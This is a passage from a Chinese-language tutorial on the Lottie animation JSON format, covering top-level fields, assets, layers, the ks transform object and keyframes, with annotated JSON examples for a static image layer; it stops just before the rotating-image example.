<p>若想深入理解 Lottie 的动画机制，从 <strong>JSON Schema</strong> 入手是一条清晰的路径。Lottie 是一个完全由数据驱动的动画系统，掌握其 JSON 结构，就等于握住了理解动画渲染逻辑的钥匙。当然，Lottie JSON 的配置项较为丰富，不必追求一次性全部记住。本文旨在帮助大家建立初步认知，为后续学习渲染引擎打下基础，做到“知其然，亦知其所以然”。</p>
<h2 data-id="heading-0"><strong>一、初识 data.json ：动画数据的顶层结构</strong></h2>
<p>Lottie 动画的本质是一套<strong>由数据驱动的图形绘制指令集</strong>，而 <code>data.json</code> 文件正是这套指令的完整载体。其<strong>顶层结构</strong>定义了动画的全局元信息，如同电影的“导演台本”，设定了动画播放的<strong>画布尺寸、时间线与基础环境</strong>。理解这些字段，是后续深入解析图层、关键帧等复杂属性的根基。</p>
<h3 data-id="heading-1"><strong>顶层元数据：动画的全局定义</strong></h3>
<p>下表列出了 <code>data.json</code> 根对象（Root Object）中的核心元数据字段，它们共同框定了动画的时空属性与渲染基础。</p>




































































<table><thead><tr><th>字段</th><th>类型</th><th>描述</th><th>示例值</th><th>单位/备注</th></tr></thead><tbody><tr><td><strong>v</strong></td><td><code>string</code></td><td><strong>Bodymovin 插件版本</strong>：生成此 JSON 所用的插件版本号，不同版本可能支持不同的特性。</td><td><code>"5.7.4"</code></td><td>-</td></tr><tr><td><strong>fr</strong></td><td><code>number</code></td><td><strong>帧率（Frame Rate）</strong> ：动画的播放速率，直接决定动画的流畅度与时间计算基准。</td><td><code>30</code>, <code>60</code></td><td>帧/秒 (fps)</td></tr><tr><td><strong>ip</strong></td><td><code>number</code></td><td><strong>起始帧（In Point）</strong> ：动画时间轴开始的绝对帧编号。</td><td><code>0</code></td><td>帧</td></tr><tr><td><strong>op</strong></td><td><code>number</code></td><td><strong>结束帧（Out Point）</strong> ：动画时间轴结束的绝对帧编号。动画总时长 = <code>(op - ip) / fr</code> 秒。</td><td><code>90</code></td><td>帧</td></tr><tr><td><strong>w</strong></td><td><code>number</code></td><td><strong>画布宽度</strong>：动画合成（Composition）的逻辑宽度。</td><td><code>800</code></td><td>像素 (px)</td></tr><tr><td><strong>h</strong></td><td><code>number</code></td><td><strong>画布高度</strong>：动画合成的逻辑高度。</td><td><code>600</code></td><td>像素 (px)</td></tr><tr><td><strong>nm</strong></td><td><code>string</code></td><td><strong>合成名称（Name）</strong> ：对应 After Effects 中合成的名称，便于识别。</td><td><code>"元数据演示动画"</code></td><td>-</td></tr><tr><td><strong>ddd</strong></td><td><code>integer</code></td><td><strong>3D 图层标识</strong>：标识此合成中<strong>是否包含 3D 图层或摄像机</strong>。<code>0</code> 代表否（默认），<code>1</code> 代表是。</td><td><code>0</code></td><td>-</td></tr></tbody></table>
<p>综合以上字段，一个定义了800x600画布、30fps、时长3秒的2D动画，其顶层结构示例如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.7.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"fr"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ip"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">800</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"h"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">600</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"元数据演示动画"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ddd"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-2"><strong>核心组成：图层、资源与字形</strong></h3>
<p><code>assets</code>、<code>chars</code> 与 <code>layers</code> 是构成 Lottie 动画内容的三个核心数据数组。它们分别定义了可复用的素材、矢量字形以及图层的序列与属性，共同描述了动画的全部视觉信息与动态行为。</p>
<h4 data-id="heading-3"><strong><code>assets</code> - 可复用资源库</strong></h4>
<p><code>assets</code> 数组用于集中定义动画中可被多次引用的静态或动态资源。此设计实现了资源复用，有助于优化文件体积并保证引用的一致性。</p>


























<table><thead><tr><th>资源类型</th><th>类型标识 (<code>ty</code>)</th><th>内容描述</th><th>引用字段</th><th>主要用途</th></tr></thead><tbody><tr><td><strong>图像资源</strong></td><td><code>"img"</code></td><td>包含图像ID、尺寸及文件路径或Base64编码数据。</td><td><code>refId</code></td><td>静态位图元素，如图标、背景。</td></tr><tr><td><strong>预合成资源</strong></td><td><code>"precomp"</code></td><td>一个完整的子合成，包含独立的图层(<code>layers</code>)与时间轴。</td><td><code>refId</code></td><td>可重复使用的动画片段，如通用动效组件。</td></tr></tbody></table>
<p><strong>引用机制</strong>：图层通过其 <code>refId</code> 属性与 <code>assets</code> 中对应ID的资源进行关联。渲染时，引擎据此查找并绘制相应资源。</p>
<h4 data-id="heading-4"><strong><code>chars</code> - 矢量字形定义</strong></h4>
<p><code>chars</code> 数组存储了将文字转换为矢量形状后的数据。当动画需要对文字进行路径变形、描边动画等超越普通文本渲染能力的操作时，会使用此数组。</p>
<ul>
<li><strong>产生条件</strong>：在After Effects中对文本图层执行“从文字创建形状”，或在导出时启用“字符形状”选项。</li>
<li><strong>数据结构</strong>：每个项定义了字符、字体信息及其矢量路径(<code>data</code>)，该路径数据包含轮廓、描边与填充等属性。</li>
<li><strong>核心用途</strong>：实现对文字字符的精细化控制，用于制作字形变形、笔画动画等效果。</li>
</ul>
<h4 data-id="heading-5"><strong><code>layers</code> - 动画图层序列</strong></h4>
<p><code>layers</code> 是一个有序数组，定义了所有图层的叠加顺序、基本属性及关键帧动画。它是组织动画渲染逻辑的主体。</p>
<ul>
<li><strong>渲染顺序</strong>：数组索引从0开始，图层按索引升序从底层到顶层依次渲染。</li>
<li><strong>核心属性</strong>：每个图层对象包含类型（如形状、图像、文本）、空间变换属性、蒙版以及关键帧动画数据。</li>
<li><strong>关键作用</strong>：<code>assets</code> 和 <code>chars</code> 中定义的资源需在此被引用，并通过图层的动画属性驱动，才能成为最终动画的一部分。</li>
</ul>
<p><strong>协作关系</strong>：<code>assets</code> 和 <code>chars</code> 作为资源定义，为 <code>layers</code> 提供素材；<code>layers</code> 则负责组织这些素材，并通过其时间轴和属性控制动画的最终表现。一个完整的结构示例如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.7.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"fr"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ip"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">800</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"h"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">600</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"元数据演示动画"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ddd"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"assets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"layers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"chars"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-6"><strong>二、图层系统 - 理解 Layers 结构</strong>⭐️</h2>
<p><code>layers</code> 数组是 Lottie JSON 中承载所有动画图层信息的主体。它定义了图层的堆叠顺序、属性及关键帧动画，是构成动画视觉呈现与动态行为的核心数据结构。Lottie 主要包含以下六种基础图层类型：</p>








































<table><thead><tr><th>类型标识 (<code>ty</code>)</th><th>图层类型</th><th>核心描述</th></tr></thead><tbody><tr><td><strong>0</strong></td><td><strong>预合成图层 (Precomp Layer)</strong></td><td>嵌套合成层，通过 <code>refId</code> 引用 <code>assets</code> 中定义的预合成资源，实现动画复用与模块化管理。</td></tr><tr><td><strong>1</strong></td><td><strong>纯色图层 (Solid Layer)</strong></td><td>纯色填充层，定义固定颜色的矩形区域，常用作背景或遮罩。</td></tr><tr><td><strong>2</strong></td><td><strong>图像图层 (Image Layer)</strong></td><td>静态图片层，通过 <code>refId</code> 引用 <code>assets</code> 中定义的图像资源。</td></tr><tr><td><strong>3</strong></td><td><strong>空对象图层 (Null Layer)</strong></td><td>不可见辅助层，主要用于通过其 <code>ks</code> 属性（变换数据）驱动子图层动画，或作为动画控制器。</td></tr><tr><td><strong>4</strong></td><td><strong>形状图层 (Shape Layer)</strong></td><td>矢量图形层，由路径、描边、填充等属性构成，是制作变形、路径动画的基础。</td></tr><tr><td><strong>5</strong></td><td><strong>文本图层 (Text Layer)</strong></td><td>文字图层，可定义字体、颜色、段落样式，并支持逐字符动画。</td></tr></tbody></table>
<p>所有图层共享一组基础属性，用于定义其在合成中的基本状态与时空关系。</p>
<p>以下属性为<strong>所有图层类型</strong>共有的基础属性：</p>





















































































































<table><thead><tr><th>属性</th><th>类型</th><th>必选</th><th>描述</th><th>示例值</th><th>默认值</th></tr></thead><tbody><tr><td><strong><code>ty</code></strong></td><td><code>number</code></td><td>是</td><td><strong>图层类型标识</strong>，决定图层的行为和数据结构（见上表）</td><td><code>0</code>-<code>5</code></td><td>-</td></tr><tr><td><strong><code>nm</code></strong></td><td><code>string</code> / <code>number</code></td><td>否</td><td><strong>图层名称</strong>，在 After Effects 中设置，用于表达式和调试</td><td><code>"按钮背景"</code>, <code>"Layer 1"</code></td><td>-</td></tr><tr><td><strong><code>ind</code></strong></td><td><code>number</code></td><td>是</td><td><strong>图层索引</strong>，在整个合成中唯一，用于父子关联和表达式引用</td><td><code>1</code>, <code>2</code>, <code>3</code></td><td>-</td></tr><tr><td><strong><code>ip</code></strong></td><td><code>number</code></td><td>是</td><td><strong>入点 (In Point)</strong>，图层开始显示的帧数</td><td><code>0</code>, <code>30</code></td><td>-</td></tr><tr><td><strong><code>op</code></strong></td><td><code>number</code></td><td>是</td><td><strong>出点 (Out Point)</strong>，图层结束显示的帧数</td><td><code>90</code>, <code>180</code></td><td>-</td></tr><tr><td><strong><code>st</code></strong></td><td><code>number</code></td><td>是</td><td><strong>起始时间 (Start Time)</strong>，图层的时间偏移量</td><td><code>0</code>, <code>10</code></td><td>-</td></tr><tr><td><strong><code>sr</code></strong></td><td><code>number</code></td><td>否</td><td><strong>时间拉伸 (Stretch)</strong>，控制图层播放速度的系数</td><td><code>1</code> (正常), <code>0.5</code> (减速), <code>2</code> (加速)</td><td><code>1</code></td></tr><tr><td><strong><code>ks</code></strong></td><td><code>object</code></td><td>是</td><td><strong>变换属性 (Transform)</strong>，包含位置、缩放、旋转、透明度等关键帧数据</td><td>见下方详解</td><td>-</td></tr><tr><td><strong><code>ao</code></strong></td><td><code>number</code></td><td>否</td><td><strong>自动定向 (Auto-Orient)</strong>，沿路径自动调整图层方向（布尔值：0/1）</td><td><code>0</code> (关闭), <code>1</code> (开启)</td><td><code>0</code></td></tr><tr><td><strong><code>ddd</code></strong></td><td><code>number</code></td><td>否</td><td><strong>3D 图层标识</strong>，标记该图层是否为 3D 图层（布尔值：0/1）</td><td><code>0</code> (2D), <code>1</code> (3D)</td><td><code>0</code></td></tr><tr><td><strong><code>parent</code></strong></td><td><code>number</code></td><td>否</td><td><strong>父图层索引</strong>，指向父图层的 <code>ind</code> 值，实现层级控制和联动变换</td><td><code>1</code>, <code>5</code></td><td>-</td></tr><tr><td><strong><code>cl</code></strong></td><td><code>string</code></td><td>否</td><td><strong>CSS 类名 (Class)</strong>，在 SVG/HTML 渲染器中作为 HTML class</td><td><code>"background"</code>, <code>"icon"</code></td><td>-</td></tr><tr><td><strong><code>ln</code></strong></td><td><code>string</code></td><td>否</td><td><strong>HTML ID</strong>，在 SVG/HTML 渲染器中作为 HTML id 属性</td><td><code>"layer-bg"</code>, <code>"main-icon"</code></td><td>-</td></tr></tbody></table>
<p>以上13个通用属性中，有 <strong>3个</strong>（<code>ip</code>、<code>op</code>、<code>nm</code>）与根对象中的概念<strong>完全一致</strong>，仅作用域不同。<strong>1个</strong>（<code>ddd</code>）与根对象概念<strong>相似但有区别</strong>：根对象的 <code>ddd</code> 表示合成“是否包含”3D元素，而图层的 <code>ddd</code> 表示其“本身是否为”3D图层。其余 <strong>9个</strong>（<code>ty</code>, <code>ind</code>, <code>st</code>, <code>sr</code>, <code>ks</code>, <code>ao</code>, <code>parent</code>, <code>cl</code>, <code>ln</code>）则是<strong>图层专有的核心属性</strong>，它们共同定义了图层在时间与空间中的基本状态。</p>
<p>接下来，我们将首先深入解析其中最核心的 <strong><code>ks</code>（变换属性）</strong>  对象，它是驱动所有图层运动与变化的关键。</p>
<h2 data-id="heading-7"><strong>三、变换属性 - 位置、旋转、缩放</strong>⭐️</h2>
<h3 data-id="heading-8">ks 对象概览</h3>
<p><code>ks</code>（Transform）是所有图层的核心动画容器，它定义了图层在空间中的位置、大小、旋转、透明度等基础变换状态。其名称 <strong><code>ks</code></strong> 是 <strong>Keyable Styled Properties（可关键帧的样式化属性）</strong>  的缩写，这精准概括了其两大核心特性：</p>
<ul>
<li><strong><code>k</code>（Keyable）</strong> ：指这些属性<strong>可被设置为关键帧</strong>，是实现所有逐帧动画的基础。</li>
<li><strong><code>s</code>（Styled）</strong> ：指这些属性<strong>可被动态驱动或赋予样式</strong>，支持通过数据或表达式进行复杂控制。</li>
</ul>
<p>因此，<code>ks</code> 对象不仅描述图层的静态空间状态，更是承载其所有运动与变换动画的<strong>数据载体</strong>。所有基础动画（如移动、缩放、旋转、淡入淡出）都通过在此对象内定义关键帧来实现。</p>
<h3 data-id="heading-9"><strong>ks 的完整属性表</strong></h3>





















































<table><thead><tr><th>属性</th><th>全称</th><th>默认值</th><th>作用</th></tr></thead><tbody><tr><td><strong><code>a</code></strong></td><td>Anchor Point</td><td><code>[0, 0, 0]</code></td><td><strong>锚点</strong>：图层变换的基准中心点（支点）。</td></tr><tr><td><strong><code>p</code></strong></td><td>Position</td><td><code>[0, 0, 0]</code></td><td><strong>位置</strong>：图层在画布中的坐标。</td></tr><tr><td><strong><code>s</code></strong></td><td>Scale</td><td><code>[100, 100, 100]</code></td><td><strong>缩放</strong>：图层的尺寸比例（以百分比表示）。</td></tr><tr><td><strong><code>r</code></strong></td><td>Rotation</td><td><code>0</code></td><td><strong>旋转</strong>：图层的旋转角度（单位为度）。</td></tr><tr><td><strong><code>o</code></strong></td><td>Opacity</td><td><code>100</code></td><td><strong>不透明度</strong>：图层的透明度（100为完全不透明，0为完全透明）。</td></tr><tr><td><strong><code>sk</code></strong></td><td>Skew</td><td><code>0</code></td><td><strong>倾斜</strong>：图层的倾斜角度（单位为度）。</td></tr><tr><td><strong><code>sa</code></strong></td><td>Skew Axis</td><td><code>0</code></td><td><strong>倾斜轴</strong>：定义倾斜操作所沿的轴向角度（单位为度）。</td></tr></tbody></table>
<blockquote>
<p> 3D 图层特殊形式：当 ddd=1 时，p 可能被拆分为 px、py、pz 三个独立属性。</p>
</blockquote>
<h3 data-id="heading-10"><strong>属性值的两种数据形态</strong></h3>
<p>每个变换属性的值均以统一的结构表示，分为 <strong>静态值</strong> 与 <strong>动画值</strong> 两种形态，通过 <code>a</code> 字段区分。</p>
<h4 data-id="heading-11"><strong>1. 静态值 (<code>a</code>: 0)</strong></h4>
<p>属性在整个时间轴上保持不变，结构简洁。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 静态标识</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45</span>        <span class="hljs-comment">// 固定值：旋转45度</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-12"><strong>2. 动画值 (<code>a</code>: 1)</strong></h4>
<p>属性值随时间变化，通过关键帧数组 (<code>k</code>) 定义。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 动画标识</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>         <span class="hljs-comment">// 关键帧数组</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// 时间点（帧）</span>
        <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 起始值</span>
        <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 结束值</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">60</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 下一关键帧时间点</span>
        <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 该帧的数值（结束时省略"e"）</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>关键帧核心字段说明</strong>：</p>
<ul>
<li><strong><code>t</code> (time)</strong> ：关键帧所处的时间点（帧序号）。</li>
<li><strong><code>s</code> (start value)</strong> ：此关键帧的起始值。</li>
<li><strong><code>e</code> (end value)</strong> ：朝向下一关键帧的<strong>目标值</strong>。最后一个关键帧可省略。</li>
<li><strong><code>i</code> / <code>o</code></strong>：定义属性变化速率（缓动）的贝塞尔曲线控制点，将在后续章节详述。</li>
</ul>
<p>此结构是 Lottie 实现所有基础运动（位移、缩放、旋转、淡入淡出）的通用数据范式。</p>
<h3 data-id="heading-13">🎨小试牛刀：动手验证核心概念</h3>
<p>通过前面的学习，我们已经掌握了 Lottie JSON 的顶层结构和核心属性。现在，让我们通过一个具体的例子，动手验证如何配置一个基础的静态场景。</p>
<p>在本例中，我们将使用一张图片，创建一个<strong>静态的图片图层</strong>。您将在下图中看到（一个静态图，一个旋转图）：</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/797a4950337a4e9ab0ddb4de2e7afc33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=yzgDCdB54V1rtVwQfYETtwLpQco%3D" alt="录屏2026-01-07 11.51.03 (1).gif" loading="lazy"/></p>
<blockquote>
<p><strong>说明</strong>：上图的 GIF 展示了包含旋转动画的完整效果。而下面的 JSON 配置，我们将首先完成<strong>左侧静态图片</strong>的搭建。这能让我们专注于已学的<strong>静态属性配置</strong>（<code>a: 0</code>）。右侧的旋转动画，将在我们学习了关键帧系统后，通过简单地修改 <code>r</code>（旋转）属性即可实现。</p>
</blockquote>
<p>以下是完整的 Lottie JSON 配置，已附上详尽的注释：</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-comment">// ========== 顶层元数据：动画的全局定义 ==========</span>
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,              <span class="hljs-comment">// Bodymovin 插件版本</span>
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,                  <span class="hljs-comment">// 帧率：30fps</span>
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,                   <span class="hljs-comment">// 起始帧：从第0帧开始</span>
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,                  <span class="hljs-comment">// 结束帧：到第90帧结束（总时长 = (90-0)/30 = 3秒）</span>
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,                  <span class="hljs-comment">// 画布宽度：800像素</span>
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,                  <span class="hljs-comment">// 画布高度：600像素</span>
  <span class="hljs-string">"nm"</span>: <span class="hljs-string">"变换属性演示"</span>,        <span class="hljs-comment">// 合成名称</span>
  <span class="hljs-string">"ddd"</span>: <span class="hljs-number">0</span>,                  <span class="hljs-comment">// 3D标识：0表示不包含3D图层</span>
  
  <span class="hljs-comment">// ========== Assets：可复用资源库 ==========</span>
  <span class="hljs-string">"assets"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"image_0"</span>,       <span class="hljs-comment">// 资源ID，供图层通过 refId 引用</span>
      <span class="hljs-string">"w"</span>: <span class="hljs-number">500</span>,              <span class="hljs-comment">// 图片原始宽度</span>
      <span class="hljs-string">"h"</span>: <span class="hljs-number">500</span>,              <span class="hljs-comment">// 图片原始高度</span>
      <span class="hljs-string">"u"</span>: <span class="hljs-string">""</span>,               <span class="hljs-comment">// 图片URL基础路径（空表示使用完整路径）</span>
      <span class="hljs-string">"p"</span>: <span class="hljs-string">"https://img11.360buyimg.com/img/jfs/t1/383242/14/16667/276460/695dd5ccF565013e8/02761c81c82b92d4.png"</span>,  <span class="hljs-comment">// 图片完整URL</span>
      <span class="hljs-string">"e"</span>: <span class="hljs-number">0</span>                 <span class="hljs-comment">// 是否嵌入：0表示外部链接</span>
    }
  ],
  
  <span class="hljs-comment">// ========== Layers：图层序列（从下到上渲染） ==========</span>
  <span class="hljs-string">"layers"</span>: [
    <span class="hljs-comment">// ---------- 图层1：静态图片（展示静态值 a:0） ----------</span>
    {
      <span class="hljs-string">"ddd"</span>: <span class="hljs-number">0</span>,              <span class="hljs-comment">// 该图层不是3D图层</span>
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,              <span class="hljs-comment">// 图层索引：1（唯一标识）</span>
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">2</span>,               <span class="hljs-comment">// 图层类型：2 = Image Layer（图像图层）</span>
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"静态图片"</span>,       <span class="hljs-comment">// 图层名称</span>
      <span class="hljs-string">"refId"</span>: <span class="hljs-string">"image_0"</span>,    <span class="hljs-comment">// 引用 assets 中 id 为 "image_0" 的资源</span>
      <span class="hljs-string">"sr"</span>: <span class="hljs-number">1</span>,               <span class="hljs-comment">// 时间拉伸：1 = 正常速度</span>
      
      <span class="hljs-comment">// ===== ks：变换属性（Transform）=====</span>
      <span class="hljs-string">"ks"</span>: {
        <span class="hljs-comment">// ----- o：不透明度（Opacity）-----</span>
        <span class="hljs-string">"o"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识（a=0 表示不动画）</span>
          <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span>           <span class="hljs-comment">// 固定值：100%不透明</span>
        },
        
        <span class="hljs-comment">// ----- r：旋转（Rotation）-----</span>
        <span class="hljs-string">"r"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: <span class="hljs-number">45</span>            <span class="hljs-comment">// 固定值：旋转45度</span>
        },
        
        <span class="hljs-comment">// ----- p：位置（Position）-----</span>
        <span class="hljs-string">"p"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">250</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>] <span class="hljs-comment">// 固定位置：[x, y, z] = 左侧250px，顶部300px</span>
        },
        
        <span class="hljs-comment">// ----- a：锚点（Anchor Point）-----</span>
        <span class="hljs-string">"a"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">250</span>, <span class="hljs-number">250</span>, <span class="hljs-number">0</span>] <span class="hljs-comment">// 锚点在图片中心（500x500图片的中心点）</span>
        },
        
        <span class="hljs-comment">// ----- s：缩放（Scale）-----</span>
        <span class="hljs-string">"s"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">100</span>] <span class="hljs-comment">// 缩放到30%（显示为150x150）</span>
        }
      },
      
      <span class="hljs-string">"ao"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// 自动定向：关闭</span>
      <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// 图层入点：第0帧开始显示</span>
      <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,              <span class="hljs-comment">// 图层出点：第90帧结束显示</span>
      <span class="hljs-string">"st"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// 起始时间偏移：0（无偏移）</span>
      <span class="hljs-string">"bm"</span>: <span class="hljs-number">0</span>                <span class="hljs-comment">// 混合模式：0 = Normal（正常）</span>
    }
  ],
  
  <span class="hljs-comment">// ========== Chars：矢量字形定义（本例未使用）==========</span>
  <span class="hljs-string">"chars"</span>: []
}
</code></pre>
<p>这个示例是一个“知识检查点”，清晰地展示了：</p>
<ul>
<li><strong>顶层元数据</strong> (<code>v</code>, <code>fr</code>, <code>w</code>, <code>h</code>...) 定义了动画的舞台（3秒、800x600的画布）。</li>
<li><strong>资源 (<code>assets</code>)</strong>  定义了唯一可用的图片素材，并通过 <code>id</code> 标识。</li>
<li><strong>图层 (<code>layers</code>)</strong>  通过 <code>refId</code> 引用该资源，将其实例化到舞台上。</li>
<li><strong><code>ks</code> 变换对象</strong> 决定了这个实例的最终状态：位于画布左侧，缩小至30%，并旋转了45度。所有属性均以<strong>静态值 (<code>a: 0</code>)</strong>  定义。</li>
</ul>
<p>至此，您已经掌握了如何构建一个 Lottie 动画的<strong>静态骨架</strong>——定义舞台、准备素材、放置元素并设置其初始状态。在上方的预览图中，您也看到了动画的潜力：<strong>只需将 <code>r</code>（旋转）属性的 <code>a</code> 值从 <code>0</code> 改为 <code>1</code>，并配上关键帧数据，静态图片就能旋转起来。</strong></p>
<p>那么，<code>a: 1</code> 模式下的 <code>k</code> 数组究竟如何定义？多个关键帧之间如何平滑过渡？动画的运动节奏又由什么控制？接下来，我们就将深入动画的核心，解析<strong>关键帧、插值与缓动</strong>的完整系统。</p>
<hr/>
<h2 data-id="heading-14"><strong>四、深入动画 - 关键帧、插值与缓动</strong>⭐️</h2>
<p>在上一章的"小试牛刀"中，我们看到了静态图片与旋转图片的对比效果。右侧的旋转效果正是通过<strong>关键帧动画</strong>实现的。现在，让我们深入解析这个旋转动画的完整JSON配置，揭开Lottie动画系统的核心机制。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/797a4950337a4e9ab0ddb4de2e7afc33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=yzgDCdB54V1rtVwQfYETtwLpQco%3D" alt="录屏2026-01-07 11.51.03 (1).gif" loading="lazy"/></p>
<p>让我们对比一下 demo 中两个图层的配置，看看静态图片是如何"动"起来的：</p>
<p><strong>静态图片（左侧）：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// 静态值标识</span>
  <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45</span>            <span class="hljs-comment">// 固定值：旋转45度</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>旋转图片（右侧）：</strong></p>
